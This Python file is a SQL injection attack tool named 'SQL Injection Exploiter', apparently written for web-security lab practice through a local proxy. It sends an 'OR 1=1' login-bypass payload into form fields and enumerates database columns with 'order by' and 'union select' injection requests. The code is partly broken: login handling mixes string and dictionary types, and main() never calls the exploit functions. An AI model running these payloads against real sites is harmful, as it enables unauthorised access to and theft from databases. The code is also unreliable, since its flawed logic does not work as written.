import requests
import urllib3
from bs4 import BeautifulSoup
import re
import argparse
import sys
from diff import difference

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def has_parameters(url):
    if '?' in url:
        base_url, params_str = url.split('?', 1)
        if '=' in params_str:
            return True
    return False

def perform_request(url, sql_payload, method, post_data=None):
    if method == 'GET':
        r = requests.get(url + sql_payload, verify=False, proxies=proxies)
    elif method == 'POST':
        r = requests.post(url, data=post_data, verify=False, proxies=proxies)
    else:
        raise ValueError("Invalid method specified.")
    return r

def try_login(url, method, post_data):
    sql_payload="'OR 1=1 # "
    def get_csrf_token(url):
        r = requests.get(url, verify=False)
        soup = BeautifulSoup(r.text, 'html.parser')
        csrf = soup.find("input")['value']
        return csrf
    try:
        csrf = get_csrf_token(url)
        if csrf:
            data = {"csrf": csrf}
            data.update({key: value for key, value in (item.split('=') for item in post_data.split('&'))})
            data[list(data.keys())[1]] = sql_payload
            print(data)
        res = perform_request(url,sql_payload, method, data)
    
    finally:
        post_data[list(post_data.keys())[0]] = sql_payload
        print(post_data)
        res = perform_request(url, sql_payload,method, post_data)
        if res.status_code == 200:
            return True,sql_payload
        else:
            return False          

def exploit_sqli_column_number(url, method, post_data=None):
    if method == 'GET':
        for i in range(1, 50):
            sql_payload = "'+order+by+%s--" % i
            r = requests.get(url + sql_payload, verify=False, proxies=proxies)
            if r.status_code == 500:
                if i - 1 == 0:
                    return "one column"
                return i - 1

def exploit_sqli_string_field(url, num_col, method, post_data=None):
    if method == 'GET':
        for i in range(1, num_col + 1):
            string = "'v2F6UA'"
            payload_list = ['null'] * num_col
            payload_list[i - 1] = string
            sql_payload = "' union select " + ','.join(payload_list) + "--"
            r = requests.get(url + sql_payload, verify=False, proxies=proxies)
            res = r.text
            if string.strip('\'') in res:
                return i
        return False


def main():
    parser = argparse.ArgumentParser(description="SQL Injection Exploiter")
    parser.add_argument('-u', help='Enter URL', dest='url')
    parser.add_argument('-m', help='Enter method', dest='method')
    parser.add_argument('-d', help='Enter post data', dest='post_data')
    parser.add_argument('-o', help='save file', dest='file', action="store_true")
    args = parser.parse_args()
    arged = False
    def help():
        print("\033[92mSQL INJECTION\033[0m")
        print ('''usage: sqlicli.py [-h] [-u URL] [-m METHOD] [-d POST_DATA]

        optional arguments:
        -h, --help    show this help message and exit
        -u URL        Enter url
        -m METHOD     Enter request method
        -d DATA       Enter your post data''')

    
if __name__ == '__main__':
    main()